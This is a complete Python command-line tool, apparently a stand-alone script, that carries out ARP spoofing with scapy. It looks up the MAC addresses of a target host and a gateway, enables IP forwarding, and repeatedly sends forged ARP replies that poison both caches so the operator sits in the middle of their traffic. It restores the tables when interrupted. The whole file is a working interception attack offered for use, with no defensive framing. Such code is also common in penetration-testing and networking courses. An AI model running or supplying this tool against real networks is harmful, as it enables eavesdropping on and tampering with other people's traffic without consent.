#!/usr/bin/python3

from scapy.all import srp, send, Ether, ARP
from pathlib import Path
from pyfiglet import figlet_format
from time import sleep
import argparse
import sys


class Spoofer:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = get_mac(target_ip)
        self.gateway_mac = get_mac(gateway_ip)
        self.interface = interface
        self.print_initialisation()

    def print_initialisation(self):
        print(f"[+] Gateway {self.gateway_ip} is at {self.gateway_mac}")
        print(f"[+] Target {self.target_ip} is at {self.target_mac}")

    def run(self):
        spoof_target = ARP(op=2, psrc=self.gateway_ip,
                           pdst=self.target_ip, hwdst=self.target_mac)
        spoof_gateway = ARP(op=2, psrc=self.target_ip,
                            pdst=self.gateway_ip, hwdst=self.gateway_mac)
        print(
            f"[*] Prepare to send to {self.target_ip}: {self.gateway_ip} is at {spoof_target.hwsrc}")
        print(
            f"[*] Prepare to send to {self.gateway_ip}: {self.target_ip} is at {spoof_gateway.hwsrc}")
        print("[+] Beginning ARP Spoofing. [CTRL+C to stop]")

        try:
            while True:
                sys.stdout.write("*")
                sys.stdout.flush()
                send(spoof_target, verbose=False)
                send(spoof_gateway, verbose=False)
                sleep(2)
        except KeyboardInterrupt:
            print(
                "\n\n[!] Detected CTRL+C ... Restoring ARP tables, please Wait.")
            self.restore()
        finally:
            sys.exit()

    def restore(self):
        restore_target = ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac,
                             pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff")
        restore_gateway = ARP(op=2, psrc=self.target_ip, hwsrc=self.target_mac,
                              pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
        send(restore_target, count=4, verbose=False)
        send(restore_gateway, count=4, verbose=False)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", action="store", type=str,
                        help="Please specify Target IP address")
    parser.add_argument("gateway", action="store", type=str,
                        help="Please specify default Gateway IP address")
    parser.add_argument("interface", action="store", type=str,
                        help="Please specify the Interface")
    return parser.parse_args()


def enable_ip_forward():
    path = Path("/proc/sys/net/ipv4/ip_forward")
    print("[*] Enabling IP forwarding.")
    try:
        with open(path, "r+") as file:
            if "1" in file.read():
                print("[!] IP forwarding was already enabled.")
            else:
                file.seek(0)
                file.write("1")
                print("[+] IP forwarding enabled.")
    except PermissionError:
        print("[-] IP forwarding requires root privileges. QUITTING!")
        sys.exit()

def get_mac(ip):
    answerred, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                       ARP(pdst=ip), timeout=2, retry=8, verbose=False)
    for _, r in answerred:
        return r[Ether].src


if __name__ == "__main__":
    print(figlet_format("ARP Spoofer"))
    arguments = get_arguments()
    target_ip = arguments.target
    gateway_ip = arguments.gateway
    interface = arguments.interface
    enable_ip_forward()
    spoofer = Spoofer(target_ip=target_ip,
                      gateway_ip=gateway_ip, interface=interface)
    spoofer.run()
